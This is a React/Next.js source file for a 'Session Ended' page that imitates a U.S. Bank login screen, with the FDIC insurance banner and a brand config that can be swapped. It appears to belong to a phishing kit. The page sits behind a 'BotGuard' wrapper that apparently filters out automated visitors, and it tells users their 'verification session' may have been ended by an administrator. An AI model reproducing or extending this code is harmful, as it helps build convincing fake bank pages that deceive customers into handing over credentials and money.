'use client';

/**
 * Terminated Page
 *
 * Professional termination page shown when session is ended
 */

import { XCircle, AlertTriangle, Clock, HelpCircle } from 'lucide-react';
import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';

export default function TerminatedPage() {
  return (
    <BotGuard>
      <div className="fdic-box">
        <img className="fdic-logo" src="/brands/us-bank/fdic-logo.svg" alt="FDIC" />
        <span className="fdic-text">FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
      </div>

      <section className="login-header">
        <h2>Session Ended</h2>
      </section>

      <div className="login-form">
        {/* Error Icon with visual emphasis */}
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          marginBottom: '24px'
        }}>
          <div style={{
            width: '72px',
            height: '72px',
            borderRadius: '50%',
            background: 'linear-gradient(135deg, #ffebee 0%, #ffcdd2 100%)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center'
          }}>
            <XCircle style={{ width: '40px', height: '40px', color: '#c62828' }} />
          </div>
        </div>

        {/* Alert message box */}
        <div style={{
          background: '#fff3e0',
          border: '1px solid #ffcc02',
          borderRadius: '4px',
          padding: '16px',
          marginBottom: '24px'
        }}>
          <div style={{ display: 'flex', alignItems: 'flex-start', gap: '12px' }}>
            <AlertTriangle className="h-5 w-5 flex-shrink-0" style={{ color: '#e65100', marginTop: '2px' }} />
            <div>
              <p style={{ fontWeight: 500, color: '#e65100', marginBottom: '4px', fontSize: '0.875rem' }}>
                Verification Session Terminated
              </p>
              <p style={{ color: '#bf360c', fontSize: '0.875rem', lineHeight: 1.5 }}>
                Your verification session has been ended. This may be due to inactivity, security concerns, or an administrative action.
              </p>
            </div>
          </div>
        </div>

        {/* Possible reasons */}
        <div style={{
          background: '#f9fafb',
          border: '1px solid #e5e7eb',
          borderRadius: '4px',
          padding: '16px',
          marginBottom: '24px'
        }}>
          <p style={{ fontWeight: 500, color: '#2e2e32', marginBottom: '12px', fontSize: '0.875rem' }}>
            This may have happened because:
          </p>
          <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
              <Clock style={{ width: '18px', height: '18px', color: '#666' }} />
              <span style={{ color: '#555', fontSize: '0.875rem' }}>The session timed out due to inactivity</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
              <AlertTriangle style={{ width: '18px', height: '18px', color: '#666' }} />
              <span style={{ color: '#555', fontSize: '0.875rem' }}>Verification could not be completed</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
              <XCircle style={{ width: '18px', height: '18px', color: '#666' }} />
              <span style={{ color: '#555', fontSize: '0.875rem' }}>The session was ended by an administrator</span>
            </div>
          </div>
        </div>

        {/* What to do next */}
        <div style={{
          background: '#fff',
          border: '1px solid #e5e7eb',
          borderRadius: '4px',
          padding: '16px',
          marginBottom: '24px'
        }}>
          <div style={{ display: 'flex', alignItems: 'flex-start', gap: '12px' }}>
            <HelpCircle className="h-5 w-5 flex-shrink-0" style={{ color: '#0c2074', marginTop: '2px' }} />
            <div>
              <p style={{ fontWeight: 500, color: '#2e2e32', marginBottom: '4px', fontSize: '0.875rem' }}>
                Need to try again?
              </p>
              <p style={{ color: '#555', fontSize: '0.875rem', lineHeight: 1.5 }}>
                If you believe this was an error, please contact our support team. They can help you restart the verification process or provide a new verification link.
              </p>
            </div>
          </div>
        </div>

        <div className="link-group">
          <p className="text-sm text-center" style={{ marginTop: '20px', color: 'var(--color-text-secondary)' }}>
            Need help? Contact {currentBrand.companyName} support
          </p>
        </div>
      </div>
    </BotGuard>
  );
}
